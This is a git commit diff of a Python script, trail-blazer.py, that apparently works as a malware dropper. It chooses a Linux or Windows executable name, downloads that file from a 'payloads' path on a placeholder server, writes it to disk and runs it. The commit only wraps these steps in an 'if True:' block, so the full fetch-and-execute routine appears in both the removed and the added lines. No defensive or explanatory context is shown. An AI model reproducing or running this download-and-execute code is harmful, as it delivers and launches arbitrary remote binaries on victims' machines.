1d1fbf2b1f6cd526793d1798ef90421387a743c9
rf-peixoto <50427765+rf-peixoto@users.noreply.github.com>
2021-07-22 21:15:31 -0300

    Update trail-blazer.py

--- Source/trail-blazer.py
+++ Source/trail-blazer.py
@@ -10,10 +10,11 @@ if platform_os == "Linux":
 elif platform_os == "Windows":
     filename = "Windows Exe Name.exe" #EXE: Executable
 
-# Download:
-data = requests.get("http://your-server.com/payloads/{0}".format(filename))
-# Save
-with open(filename, "wb") as fl:
-    fl.write(data.content)
-# Run:
-subprocess.Popen(args="", executable=filename)
+if True:
+    # Download:
+    data = requests.get("http://your-server.com/payloads/{0}".format(filename))
+    # Save
+    with open(filename, "wb") as fl:
+        fl.write(data.content)
+    # Run:
+    subprocess.Popen(args="", executable=filename)
